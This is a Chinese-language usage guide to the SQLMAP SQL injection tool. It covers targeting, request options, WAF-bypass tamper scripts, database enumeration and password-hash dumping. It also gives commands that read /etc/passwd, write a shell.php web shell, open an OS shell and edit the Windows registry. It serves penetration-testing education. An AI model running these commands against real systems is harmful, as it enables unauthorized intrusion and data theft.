0x00    前言
     不管对于新手小白，还是圈内大佬，SQLMAP 都是一款非常强大渗透测试工具，它的主要功能是对sql注入的检测和利用，然而很多人对于SQLMAP ，只是很简单的几个命令的使用，对于它的其他功能却知之甚少。

0x01    安装、升级

git clone http://github.com/sqlmapproject/sqlmap.git

sqlmap --update   在线升级

git pull  离线升级

0x02    命令介绍

-h       查看帮助文档

-hh     查看更加详细的帮助文档（本文基于这个）

TARGET(扫描目标)    

Get 方法

sqlmap -u "http://1.1.1.1/c?id=1" -p id -f

-p   指定参数

-f     列出指纹信息

POST 方法

burp抓包并保存(request.txt)

sqlmap -r request.txt  

扫描URL  列表文件

将要扫描的url  逐条保存于文本文档(url_list.txt)，一行一条记录

sqlmap -m usr_list.txt

扫描burp  log 文件

burp -l burp.log

扫描google搜索结果

sqlmap -g "inurl:?id=1"

https 注入

sqlmap -u "http://1.1.1.1/c?id=1" --force-ssl    

REQUEST(扫描请求) 

--data   数据段(适用于get/post)

sqlmap -u "http:/1.1.1.1/a.php" --data="user=1&pass=1" -f  

 --param-del    变量分割符号

  (一般url 参数之间用& 连接，但是不乏一些特别的url,如用 ； // ： 连接的，要测试这些站点，这个参数就派上用场了)

sqlmap -u "http://1.1.1.1/a.php?id=1;name=crhua" --param-del=";" -f

--cookie 

web应用需要基于cookie的身份验证

sqlmap -u "http://1.1.1.1/a.php?id=1" --cookie="session=222"  -f

--user-agent   设置user-agent

sqlmap -u "http://1.1.1.1/a.php?id=1" --user-agent="Mozilla/5.0 (Windows NT 10.0; WOW64; rv:54.0) Gecko/20100101 Firefox/54.0"

--random-agent   扫描时候使用随机user-agent

默认路径 /usr/share/sqlmap/txt/user-agentss.txt

sqlmap   检测user-agent 中的注入点 ：level >=3

sqlmap -u "http://1.1.1.1/a.php?id=1" --random-agent  -f   

--headers     额外的header 头

sqlmap -u "http://1.1.1.1/a.php?id=1" --headers="Host:www.crhua.com\nUser-Agent:crhua"

注：检测Host 头注入点   level =5

检测Referer 头 注入点   level >= 3

http协议认证

认证类型     Basic    Didest   NTML

sqlmap -u "http://1.1.1.1/a.php?id=1" --auth-type Basic --auth-cred "user:pass"

http(s)  代理

--proxy="http://127.0.0.1:8087"

--proxy-cred="user:pass" 需要登陆的代理

--ignore-proxy       忽略系统级代理，通常用于本地网络扫描

sqlmap -u "http://1.1.1.1/a.php?id=1" --proxy="http://127.0.0.1:8087"    -f

 --delay

每次http(s) 请求之间的延迟时间，默认无延迟

 --timeout

 请求超时时间，默认30s

--retries

http(s) 连接超时重试次数，默认3次

 --safe-url / --safe-freq

检测和盲注阶段会发送大量的失败请求，服务端可能会销毁session,每发送 --safe-freq次注入请求之后，发送一次正常请求

OPTIMIZATION(优化性能)

--predict-output

根据测试返回的内容与统计表(usr/share/sqlmap/txt/common-outputs.txt) 比对，缩小检测范围，提高效率

--keep-alive

使用http(s) 长连接，性能好，但是会占用服务器资源

--threads

最大并发线程，默认为1，建议不要超过10

INJECTION(注入）

--skip

排除指定参数

URI 注入点

在要检测的注入点处 加 * 号，伪静态注入亦如此

sqlmap  -u "http://1.1.1.1/param1/value1*/param2/value2"

--invalid-bignum / --invalid-logical

通常sqlmap 注入 使用负值使参数失效 id=1 -->  id=-1

--invalid-bignum    使用大数值使参数失效  id=99999999

--invalid-logical      使用布尔使参数失效   id=1  AND 1=2

--prefix / --suffix

前缀 / 后缀  需要知道sql 语句

$query = "select * from crhua where id = ('".$_GET['id']."')  limit 0,1" sqlmap  -u "http://1.1.1.1/a.php?id=1" --prefix="')"  --suffix="AND ('a'='a "

--tamper

脚本，用于绕过WAF

sqlmap  -u  "http://1.1.1.1/a.php?id=1" --tamper="safedog.py"

(回复tamper获得相关资料)

--level 1-5 级 默认1

--risk  1-4  默认1   risk升高可造成数据被篡改的风险

ENUMERTION(枚举)

-a 列出所有内容

--current-user 数据库当前用户

--current-db 当前数据库名

--passwords 枚举数据账户密码的hash值

--sql-shell    获得一个SQL shell

--sql-query=QUERY 执行一个SQL 语句

file_system文件系统

--file-read="/etc/passwd"

--file-write="shell.php" --file-dest="/tmp/shell.php"

(写入文件  写入地址）

os 操作系统

--os-shell  

--os-cmd

windows 注册表

--reg-read

--reg-add

--reg-del

--reg-key

--reg-value

--reg-data

--reg-data

--reg-type

sqlmap –u="http://1.1.1.1/a.aspx?id=1" --reg-add --regkey="HKEY_LOCAL_MACHINE\SOFTWARE\sqlmap" --reg-value=Test -reg-type=REG_SZ --reg-data=1 

(关于注册表我这里有全英资料，回复"reg"获得)

其他命令

--charset 强制字符编码

--flush-ssession  清除session

--check-waf 检查waf/ids/ips

--hpp  http 渲染

--wizard 人性化提示使用
